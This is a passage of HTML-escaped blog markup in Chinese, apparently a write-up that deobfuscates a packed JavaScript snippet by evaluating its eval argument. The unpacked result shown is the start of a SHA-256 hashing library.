class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">R&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">))}}&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271n&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201t&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202r&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">)){&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="o">||!&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">)){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201t&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">)}}}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201t&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">)}}&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20N&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">)).&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="mi">27&lt;/span>&lt;span class="p">()}&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201F&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[],&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[];&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20N&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202W&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">27&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">)}};&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20X&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20X&lt;/span>&lt;span class="p">})}}})();&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202y&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20t&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="o">&amp;gt;=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20t&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202J&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x224B&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x221M&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x221M&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202B&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x224E&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x221M&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x221M&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202K&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x221M&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x222F&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x222F&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x224M&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">)},&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">o&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x224P&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x224R&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x223O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x22&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">44&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>显然是一段加密过的js脚本，现在有个偷懒的办法，直接执行&lt;code>eval&lt;/code>的参数看看效果，成功得到下面的代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="p">(&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="s1">&amp;#39;use strict&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">ERROR&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;input is invalid type&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">WINDOW&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">typeof&lt;/span> &lt;span class="nb">window&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="s1">&amp;#39;object&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">root&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">WINDOW&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="nb">window&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="p">{};&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">JS_SHA256_NO_WINDOW&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">WINDOW&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">WEB_WORKER&lt;/span>&lt;span class="o">=!&lt;/span>&lt;span class="nx">WINDOW&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="k">typeof&lt;/span> &lt;span class="nx">self&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="s1">&amp;#39;object&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">NODE_JS&lt;/span>&lt;span class="o">=!&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">JS_SHA256_NO_NODE_JS&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="k">typeof&lt;/span> &lt;span class="nx">process&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="s1">&amp;#39;object&amp;#39;&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">process&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">versions&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">process&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">versions&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">NODE_JS&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">global&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">WEB_WORKER&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">self&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">COMMON_JS&lt;/span>&lt;span class="o">=!&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">JS_SHA256_NO_COMMON_JS&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="k">typeof&lt;/span> &lt;span class="nx">module&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="s1">&amp;#39;object&amp;#39;&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">module&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">exports&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">AMD&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">typeof&lt;/span> &lt;span class="nx">define&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="s1">&amp;#39;function&amp;#39;&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">define&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">amd&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">ARRAY_BUFFER&lt;/span>&lt;span class="o">=!&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">JS_SHA256_NO_ARRAY_BUFFER&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="k">typeof&lt;/span> &lt;span class="nx">ArrayBuffer&lt;/span>&lt;span 